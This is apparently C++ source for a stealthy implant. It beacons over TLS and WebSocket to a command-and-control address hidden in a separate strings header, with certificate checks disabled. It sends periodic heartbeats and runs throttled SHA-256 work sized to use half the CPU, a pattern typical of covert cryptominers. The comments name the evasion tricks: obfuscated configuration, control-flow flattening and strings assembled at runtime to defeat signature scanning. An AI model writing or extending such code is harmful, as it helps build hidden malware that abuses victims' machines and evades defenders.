#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <cstring>
#include <random>
#include <sstream>

#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <fcntl.h>

#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/sha.h>

#include "hidden_strings.h"

// Configuración Ofuscada
#define TARGET_CPU_USAGE 0.5
#define WORK_SLICE_MS 50
#define HEARTBEAT_INTERVAL_SEC 10

// Globales
SSL_CTX *ctx = nullptr;
SSL *ssl = nullptr;
int sock = -1;
int current_state = 0; // State Machine Pointer

// Utilidades
std::string base64_encode(const unsigned char* buffer, size_t length) {
    static const char* b64_table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string ret; ret.reserve((length + 2) / 3 * 4);
    int val = 0, valb = -6;
    for (size_t i = 0; i < length; ++i) {
        val = (val << 8) + buffer[i]; valb += 8;
        while (valb >= 0) { ret.push_back(b64_table[(val >> valb) & 0x3F]); valb -= 6; }
    }
    if (valb > -6) ret.push_back(b64_table[((val << 8) >> (valb + 8)) & 0x3F]);
    while (ret.size() % 4) ret.push_back('=');
    return ret;
}

std::string generate_key() {
    unsigned char buf[16]; std::random_device rd;
    for(int i=0; i<16; i++) buf[i] = rd() % 256;
    return base64_encode(buf, 16);
}

std::vector<uint8_t> create_frame(const std::string& msg) {
    std::vector<uint8_t> f; f.push_back(0x81);
    size_t len = msg.length();
    if (len <= 125) f.push_back(len | 0x80);
    else { f.push_back(126 | 0x80); f.push_back((len >> 8) & 0xFF); f.push_back(len & 0xFF); }
    std::random_device rd; uint8_t m[4];
    for(int i=0; i<4; i++) { m[i] = rd() % 256; f.push_back(m[i]); }
    for(size_t i=0; i<len; i++) f.push_back(msg[i] ^ m[i % 4]);
    return f;
}

void do_heavy_lifting() {
    unsigned char h[SHA256_DIGEST_LENGTH];
    // Junk data generada en runtime para evitar strings
    std::string d = "xxxx"; d[0]='d'; d[1]='a'; d[2]='t'; d[3]='a';
    SHA256_CTX s;
    auto start = std::chrono::high_resolution_clock::now();
    while (true) {
        SHA256_Init(&s); SHA256_Update(&s, d.c_str(), d.size()); SHA256_Final(h, &s);
        d[0]++;
        if (std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::high_resolution_clock::now() - start).count() >= WORK_SLICE_MS) break;
    }
}

int main() {
    std::chrono::steady_clock::time_point last_hb;
    char rx_buf[1024];

    // Control Flow Flattening Loop
    while (true) {
        switch (current_state) {
            case 0: // INIT
                SSL_library_init();
                SSL_load_error_strings();
                current_state = 1;
                break;

            case 1: // TCP CONNECT
            {
                const SSL_METHOD *m = TLS_client_method();
                ctx = SSL_CTX_new(m);
                sock = socket(AF_INET, SOCK_STREAM, 0);
                struct sockaddr_in sa;
                sa.sin_family = AF_INET;
                sa.sin_port = htons(8443);
                std::string ip_dec = S_IP;
                if (inet_pton(AF_INET, ip_dec.c_str(), &sa.sin_addr) <= 0) {
                     current_state = 99; break;
                }

                if (connect(sock, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
                    current_state = 99; // Retry or Die
                } else {
                    current_state = 2; // Next
                }
            }
            break;

            case 2: // SSL & WSS HANDSHAKE
            {
                ssl = SSL_new(ctx);
                SSL_set_fd(ssl, sock);
                SSL_set_verify(ssl, SSL_VERIFY_NONE, NULL);
                if (SSL_connect(ssl) <= 0) { current_state = 99; break; }

                std::string k = generate_key();
                std::string req = S_REQ_START;
                req += k + "\r\n";
                req += S_USER_AGENT;

                SSL_write(ssl, req.c_str(), req.length());
                int b = SSL_read(ssl, rx_buf, sizeof(rx_buf)-1);
                if (b > 0 && std::string(rx_buf).find(S_SWITCHING) != std::string::npos) {
                    int f = fcntl(sock, F_GETFL, 0);
                    fcntl(sock, F_SETFL, f | O_NONBLOCK);
                    last_hb = std::chrono::steady_clock::now();
                    current_state = 3; // MAIN LOOP
                } else {
                    current_state = 99;
                }
            }
            break;

            case 3: // MAIN DECISION
            {
                int r = SSL_read(ssl, rx_buf, sizeof(rx_buf));

                auto now = std::chrono::steady_clock::now();
                if (std::chrono::duration_cast<std::chrono::seconds>(now - last_hb).count() >= HEARTBEAT_INTERVAL_SEC) {
                    current_state = 4;
                } else {
                    current_state = 5;
                }
            }
            break;

            case 4: // SEND HEARTBEAT
            {
                auto f = create_frame(S_HEARTBEAT);
                SSL_write(ssl, f.data(), f.size());
                last_hb = std::chrono::steady_clock::now();
                current_state = 5;
            }
            break;

            case 5: // COMPUTE
                do_heavy_lifting();
                current_state = 6;
                break;

            case 6: // SLEEP
                std::this_thread::sleep_for(std::chrono::milliseconds(WORK_SLICE_MS));
                current_state = 3;
                break;

            case 99: // ERROR
                if (ssl) SSL_free(ssl);
                if (sock > 0) close(sock);
                return 1;
        }
    }
    return 0;
}
